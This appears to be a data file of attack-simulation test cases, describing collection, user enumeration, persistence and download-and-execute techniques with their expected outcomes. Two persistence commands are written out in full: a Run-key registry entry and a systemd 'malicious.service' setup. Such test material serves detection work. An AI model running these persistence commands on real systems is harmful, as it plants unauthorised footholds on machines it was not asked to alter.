attacks.description: Creates a test file in the temp directory, then uses PowerShell to compress-archive this file into a zip archive, overwriting any existing archive with the same name.
attacks.expected_behavior: A zip archive named 'archived.zip' containing 'testfile.txt' will be created in the %TEMP% directory.

attacks.description: Encodes a test file using certutil, then archives the encoded file using PowerShell, demonstrating an intermediate step of data manipulation before archiving.
attacks.expected_behavior: An encoded version of 'testfile.txt' will be created and then archived into 'encoded_archive.zip' in the %TEMP% directory.

attacks.description: Uses PowerShell to add the System.IO.Compression.FileSystem assembly and then creates a zip archive of the entire %TEMP% directory, demonstrating a more advanced archiving technique.
attacks.expected_behavior: A zip archive named 'advanced_archive.zip' containing all files in the %TEMP% directory will be created in the %TEMP% directory.

attacks.description: Basic example of archiving collected data using 'tar'. This command creates a compressed archive of files in '/path/to/data'.
attacks.expected_behavior: Creates a compressed archive file named 'archive.tar.gz' containing the files from '/path/to/data'.

attacks.description: Intermediate example using 'find' to select files and 'tar' to archive them. This command is more flexible and can handle file names with spaces or special characters.
attacks.expected_behavior: Creates a compressed archive file named 'archive.tar.gz' containing files found by 'find' in '/path/to/data', handling file names safely.

attacks.description: Advanced example that archives sensitive data to a specific location requiring elevated privileges. This demonstrates a scenario where an attacker might try to collect and archive sensitive information.
attacks.expected_behavior: Creates a compressed archive file named 'archive.tar.gz' in '/root' containing sensitive files from '/path/to/sensitive/data', requiring root access.

attacks.description: List local users
attacks.expected_behavior: Retrieve a list of local user accounts

attacks.description: Retrieve current user information
attacks.expected_behavior: Display detailed information about the current user

attacks.description: List administrators group members
attacks.expected_behavior: Retrieve a list of members in the local administrators group

attacks.description: List all users on the system by querying the passwd database.
attacks.expected_behavior: This command will output a list of all users on the system, including their user ID, group ID, and home directory.

attacks.description: Get information about all users on the system.
attacks.expected_behavior: This command will output detailed information about each user, including their user ID, group ID, and the groups they belong to.

attacks.description: View the contents of the passwd file, which contains information about all users on the system.
attacks.expected_behavior: This command will output the contents of the passwd file, showing information about each user, including their username, user ID, group ID, and home directory.

attacks.description: Add a new registry key to run calc.exe at login
attacks.expected_behavior: The registry key is added, and calc.exe will run at the next login

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "cmd.exe /c echo Hello World > %TEMP%\test.txt" /f
attacks.description: Add a new registry key to run a command at login and write to a file
attacks.expected_behavior: The registry key is added, and a file named test.txt will be created in the temp directory at the next login

attacks.description: Delete a registry key
attacks.expected_behavior: The registry key is deleted

attacks.description: Basic command to add a cron job for persistence, assuming the malicious script is located at /path/to/malicious/script.sh
attacks.expected_behavior: Adds a cron job that runs the specified script at every minute, achieving persistence

attacks.description: Intermediate command to add a cron job that runs at reboot for persistence
attacks.expected_behavior: Modifies the user's crontab to run the specified script at system reboot, ensuring persistence

attacks.command:
echo '[Unit]
Description=Malicious Service
[Service]
ExecStart=/path/to/malicious/script.sh
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/malicious.service && systemctl daemon-reload && systemctl enable malicious.service
attacks.description: Advanced command to create a systemd service for persistence, assuming systemd is available
attacks.expected_behavior: Creates a systemd service that runs the specified script at system startup, achieving persistence

attacks.description: Download and execute a benign file using certutil.exe
attacks.expected_behavior: The benign file will be downloaded to %TEMP% and executed.

attacks.description: Execute a benign script from %TEMP% using PowerShell
attacks.expected_behavior: The benign script will be executed from %TEMP%.

attacks.description: Execute a benign command using PowerShell with Invoke-Expression
attacks.expected_behavior: The benign command will be executed, printing 'Benign Command' to the console.

attacks.description: Basic execution of a malicious script using bash
attacks.expected_behavior: The malicious script will be executed with the user's privileges.

attacks.description: Intermediate execution by downloading a malicious file and then executing it
attacks.expected_behavior: The malicious file will be downloaded and then executed with the user's privileges.

attacks.description: Advanced execution by downloading and piping a malicious script to bash
attacks.expected_behavior: The malicious script will be downloaded and executed directly by bash with the user's privileges.
